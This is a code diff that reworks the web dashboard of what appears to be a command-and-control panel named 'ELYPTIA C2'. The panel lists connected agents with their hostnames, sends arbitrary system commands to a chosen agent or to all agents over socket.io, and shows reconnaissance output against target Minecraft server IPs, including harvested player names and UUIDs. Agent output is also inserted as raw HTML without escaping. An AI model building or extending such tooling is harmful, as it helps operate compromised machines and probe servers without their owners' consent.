@@ -5,15 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ELYPTIA | ULTRON COMMAND CENTER</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=JetBrains+Mono:wght@300;500&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=JetBrains+Mono:wght@300;500&display=swap" rel="stylesheet" />
     <style>
         :root {
             --bg: #050505;
             --accent: #00f2ff;
-            --accent-dark: #006b70;
-            --glass: rgba(20, 20, 20, 0.7);
             --border: rgba(0, 242, 255, 0.2);
+            --glass: rgba(20, 20, 20, 0.8);
             --text: #e0e0e0;
         }
 
@@ -22,240 +20,113 @@
             background: var(--bg);
             color: var(--text);
             font-family: 'JetBrains+Mono', monospace;
+            height: 100vh;
             overflow: hidden;
-            height: 100vh;
         }
 
-        /* Animated Background */
         .grid {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background-image: 
-                linear-gradient(var(--border) 1px, transparent 1px),
-                linear-gradient(90deg, var(--border) 1px, transparent 1px);
-            background-size: 50px 50px;
-            perspective: 1000px;
-            transform: rotateX(60deg) translateY(-200px);
-            opacity: 0.15;
-            z-index: -1;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-image: linear-gradient(var(--border) 1px, transparent 1px), linear-gradient(90deg, var(--border) 1px, transparent 1px);
+            background-size: 50px 50px; transform: rotateX(60deg) translateY(-200px);
+            opacity: 0.1; z-index: -1;
         }
 
-        /* Layout */
         .app-container {
-            display: grid;
-            grid-template-columns: 300px 1fr;
-            height: 100vh;
-            padding: 20px;
-            gap: 20px;
-            backdrop-filter: blur(5px);
+            display: grid; grid-template-columns: 320px 1fr;
+            height: 100vh; padding: 20px; gap: 20px;
         }
 
-        /* Sidebar - Agents List */
+        /* Sidebar */
         .sidebar {
             background: var(--glass);
             border: 1px solid var(--border);
-            border-radius: 15px;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
+            border-radius: 12px; padding: 20px;
+            display: flex; flex-direction: column; gap: 15px;
             overflow-y: auto;
-        }
-
-        .sidebar h2 {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 14px;
-            color: var(--accent);
-            letter-spacing: 2px;
-            margin-bottom: 10px;
-            text-transform: uppercase;
         }
 
         .agent-card {
-            background: rgba(255, 255, 255, 0.03);
-            border: 1px solid transparent;
-            padding: 12px;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s;
+            background: rgba(255,255,255,0.05); padding: 12px;
+            border-radius: 8px; cursor: pointer; border: 1px solid transparent;
+            transition: 0.3s;
         }
+        .agent-card.active { border-color: var(--accent); background: rgba(0, 242, 255, 0.1); }
 
-        .agent-card:hover, .agent-card.active {
-            border-color: var(--accent);
-            background: rgba(0, 242, 255, 0.05);
-            box-shadow: 0 0 15px rgba(0, 242, 255, 0.1);
-        }
+        /* Main View */
+        .main-content { display: grid; grid-template-rows: auto 1fr auto; gap: 20px; }
 
-        .agent-info { font-size: 11px; color: #888; margin-top: 5px; }
-        .status-dot {
-            width: 8px; height: 8px; border-radius: 50%;
-            display: inline-block; margin-right: 5px;
-            background: #555;
-        }
-        .status-dot.online { background: #00ff88; box-shadow: 0 0 8px #00ff88; }
-
-        /* Main Content */
-        .main-content {
-            display: grid;
-            grid-template-rows: auto 1fr auto;
-            gap: 20px;
-        }
-
-        /* Header / Stats */
-        .stats-bar {
-            display: flex;
-            gap: 20px;
-        }
-
-        .stat-box {
-            background: var(--glass);
-            border: 1px solid var(--border);
-            padding: 15px 25px;
-            border-radius: 12px;
-            flex: 1;
-        }
-
-        .stat-label { font-size: 10px; color: var(--accent); text-transform: uppercase; }
-        .stat-value { font-size: 20px; font-weight: bold; margin-top: 5px; }
-
-        /* Terminal Window */
         .terminal-container {
-            background: rgba(10, 10, 10, 0.85);
+            background: rgba(10, 10, 10, 0.9);
             border: 1px solid var(--border);
-            border-radius: 15px;
-            position: relative;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
+            border-radius: 12px; display: flex; flex-direction: column; overflow: hidden;
         }
 
         .terminal-header {
-            background: rgba(0, 242, 255, 0.1);
-            padding: 10px 15px;
-            font-size: 12px;
-            border-bottom: 1px solid var(--border);
-            display: flex;
-            justify-content: space-between;
+            background: rgba(0, 242, 255, 0.1); padding: 10px 15px;
+            font-size: 11px; border-bottom: 1px solid var(--border);
+            display: flex; justify-content: space-between;
         }
 
         #terminal-output {
-            flex: 1;
-            padding: 20px;
-            overflow-y: auto;
-            font-size: 13px;
-            line-height: 1.6;
-            color: #ccc;
+            flex: 1; padding: 15px; overflow-y: auto;
+            font-size: 13px; line-height: 1.5;
         }
 
         .response-block {
-            margin-bottom: 15px;
-            padding: 15px;
-            background: rgba(255, 255, 255, 0.02);
+            margin-bottom: 20px; padding: 12px;
+            background: rgba(255, 255, 255, 0.03);
             border-left: 3px solid var(--accent);
-            border-radius: 4px;
-            animation: slideIn 0.4s ease-out;
+            white-space: pre-wrap;
         }
 
-        @keyframes slideIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }
-
-        /* Input Area */
+        /* Input Zone */
         .input-bar {
-            display: flex;
-            gap: 10px;
-            background: var(--glass);
-            padding: 15px;
-            border: 1px solid var(--border);
-            border-radius: 12px;
+            display: flex; gap: 15px; background: var(--glass);
+            padding: 15px; border: 1px solid var(--border); border-radius: 12px;
         }
 
         input {
-            flex: 1;
-            background: transparent;
-            border: none;
-            color: var(--accent);
-            font-size: 16px;
-            font-family: inherit;
-            outline: none;
+            flex: 1; background: transparent; border: none;
+            color: var(--accent); font-family: inherit; font-size: 14px; outline: none;
         }
 
         button {
-            background: var(--accent);
-            color: #000;
-            border: none;
-            padding: 10px 25px;
-            border-radius: 6px;
-            font-weight: bold;
-            cursor: pointer;
-            font-family: 'Orbitron', sans-serif;
-            transition: 0.3s;
+            background: var(--accent); color: #000; border: none;
+            padding: 8px 20px; border-radius: 4px; font-weight: bold;
+            cursor: pointer; font-family: 'Orbitron', sans-serif;
         }
 
-        button:hover {
-            box-shadow: 0 0 20px var(--accent);
-            transform: scale(1.02);
-        }
-
-        /* Player Heads Extraction Styling */
-        .player-head {
-            width: 32px; height: 32px;
-            image-rendering: pixelated;
-            vertical-align: middle;
-            margin-right: 10px;
-            border: 1px solid var(--accent);
-        }
+        .player-entry { display: flex; align-items: center; margin: 5px 0; }
+        .player-head { width: 24px; height: 24px; margin-right: 10px; border: 1px solid var(--accent); }
     </style>
 </head>
 <body>
     <div class="grid"></div>
-    
     <div class="app-container">
-        <!-- Dashboard Sidebar -->
         <div class="sidebar">
-            <div style="text-align: center; margin-bottom: 20px;">
-                <h1 style="font-family: 'Orbitron', sans-serif; font-size: 24px; color: var(--accent);">ELYPTIA</h1>
-                <div style="font-size: 10px; opacity: 0.5;">CYBER COMMAND V3.0</div>
-            </div>
-            
-            <h2>Tactical Agents</h2>
-            <div id="agent-list">
-                <!-- Agents will be injected here -->
-            </div>
+            <h1 style="font-family: 'Orbitron'; font-size: 18px; color: var(--accent); text-align: center;">ELYPTIA C2</h1>
+            <div id="agent-list"></div>
         </div>
 
-        <!-- Main Interface -->
         <div class="main-content">
-            <div class="stats-bar">
-                <div class="stat-box">
-                    <div class="stat-label">Active Connections</div>
-                    <div id="active-count" class="stat-value">0</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-label">Server Status</div>
-                    <div class="stat-value" style="color: #00ff88;">OPERATIONAL</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-label">Global Latency</div>
-                    <div class="stat-value">12ms</div>
-                </div>
+            <div style="background: var(--glass); padding: 15px; border-radius: 12px; border: 1px solid var(--border); display: flex; justify-content: space-between;">
+                <div>STATUS: <span style="color: #00ff88;">ONLINE</span></div>
+                <div id="active-target">TARGET: ALL</div>
             </div>
 
             <div class="terminal-container">
                 <div class="terminal-header">
-                    <span>SYSTEM_LOGS.EXE</span>
-                    <span id="current-agent-status">NO AGENT SELECTED</span>
+                    <span>TERMINAL_RECON_V5</span>
+                    <span id="conn-status">CONNECTED</span>
                 </div>
                 <div id="terminal-output">
-                    <div class="response-block" style="border-left-color: #555;">
-                        > Welcome to Elyptia Ultron System Control.<br>
-                        > Select an agent to begin tactical operations or enter a Target IP.
-                    </div>
+                    <div class="response-block" style="border-color: #555;">> En attente d'une cible... Entrez une IP Minecraft ou une commande système.</div>
                 </div>
             </div>
 
             <div class="input-bar">
-                <span>></span>
-                <input type="text" id="command-input" placeholder="Enter Target IP or System Command..." autocomplete="off">
-                <button onclick="sendCommand()">EXECUTE</button>
+                <input type="text" id="cmd-input" placeholder="IP Cible (ex: 82.64.x.x) ou commande système..." autocomplete="off">
+                <button id="send-btn">EXECUTE</button>
             </div>
         </div>
     </div>
@@ -264,78 +135,77 @@
         const socket = io();
         let selectedAgent = 'all';
 
+        function addLog(msg, color = "#e0e0e0") {
+            const out = document.getElementById('terminal-output');
+            const div = document.createElement('div');
+            div.className = 'response-block';
+            
+            // Auto-formatage des joueurs avec tête
+            let html = msg.replace(/├─ ● (.*?) \((.*?)\)/g, (m, name, uuid) => {
+                return `<div class="player-entry"><img src="https://minotar.net/avatar/${name}/24" class="player-head"><b>${name}</b> <span style="opacity:0.4; font-size:10px;">[${uuid}]</span></div>`;
+            });
+            
+            div.innerHTML = html;
+            out.appendChild(div);
+            out.scrollTop = out.scrollHeight;
+        }
+
         socket.on('update_dashboard', (agents) => {
             const list = document.getElementById('agent-list');
-            const count = document.getElementById('active-count');
             list.innerHTML = '';
-            
-            let i = 0;
             for (const id in agents) {
-                i++;
-                const agent = agents[id];
                 const div = document.createElement('div');
                 div.className = `agent-card ${selectedAgent === id ? 'active' : ''}`;
                 div.onclick = () => {
                     selectedAgent = id;
+                    document.getElementById('active-target').innerText = "TARGET: " + id;
                     document.querySelectorAll('.agent-card').forEach(c => c.classList.remove('active'));
                     div.classList.add('active');
-                    document.getElementById('current-agent-status').innerText = `TARGETING: ${id}`;
                 };
-                
-                div.innerHTML = `
-                    <div><span class="status-dot online"></span> ${id}</div>
-                    <div class="agent-info">${agent.hostname} | ${agent.ip}</div>
-                `;
+                div.innerHTML = `<b>${id}</b><br><span style="font-size:10px; opacity:0.6;">${agents[id].hostname}</span>`;
                 list.appendChild(div);
             }
-            count.innerText = i;
         });
 
         socket.on('display_response', (data) => {
-            const output = document.getElementById('terminal-output');
-            const block = document.createElement('div');
-            block.className = 'response-block';
-            
-            // Formatage intelligent pour les joueurs Minecraft (Minotar)
-            let formattedOutput = data.output.replace(/ID: (.*?) \| UUID: (.*?)\n/g, (match, name, uuid) => {
-                return `<div><img src="https://minotar.net/avatar/${name}/32" class="player-head"> <b>${name}</b> <span style="font-size:10px; opacity:0.5;">(${uuid})</span></div>`;
-            });
-
-            block.innerHTML = `
-                <div style="font-size: 10px; color: var(--accent); margin-bottom: 5px;">[${data.time}] RESPONSE FROM ${data.id}:</div>
-                <div style="white-space: pre-wrap;">${formattedOutput}</div>
-            `;
-            output.appendChild(block);
-            output.scrollTop = output.scrollHeight;
-            
-            // Effect sonore ou flash ? (Optionnel)
-            gsap.from(block, { duration: 0.5, x: -20, opacity: 0 });
+            addLog(`[${data.time}] REPONSE DE ${data.id}:\n${data.output}`);
         });
 
-        function sendCommand() {
-            const input = document.getElementById('command-input');
-            const cmd = input.value;
-            if (!cmd) return;
+        function doSend() {
+            const input = document.getElementById('cmd-input');
+            const val = input.value.trim();
+            if (!val) return;
 
             socket.emit('dispatch_command', {
                 target: selectedAgent,
-                command: cmd
+                command: val
             });
-
-            // Echo local
-            const output = document.getElementById('terminal-output');
-            const echo = document.createElement('div');
-            echo.style.color = "#555";
-            echo.style.marginBottom = "10px";
-            echo.innerHTML = `> Sent to ${selectedAgent}: ${cmd}`;
-            output.appendChild(echo);
-            output.scrollTop = output.scrollHeight;
-
+            
+            addLog(`> Envoi vers ${selectedAgent} : ${val}`, "#555");
             input.value = '';
         }
 
-        document.getElementById('command-input').addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') sendCommand();
+        // CORRECTIF ANTI-REFRESH
+        document.getElementById('send-btn').addEventListener('click', (e) => {
+            e.preventDefault();
+            doSend();
+        });
+
+        document.getElementById('cmd-input').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                doSend();
+            }
+        });
+
+        socket.on('disconnect', () => {
+            document.getElementById('conn-status').innerText = "DISCONNECTED";
+            document.getElementById('conn-status').style.color = "red";
+        });
+
+        socket.on('connect', () => {
+            document.getElementById('conn-status').innerText = "CONNECTED";
+            document.getElementById('conn-status').style.color = "var(--accent)";
         });
     </script>
 </body>
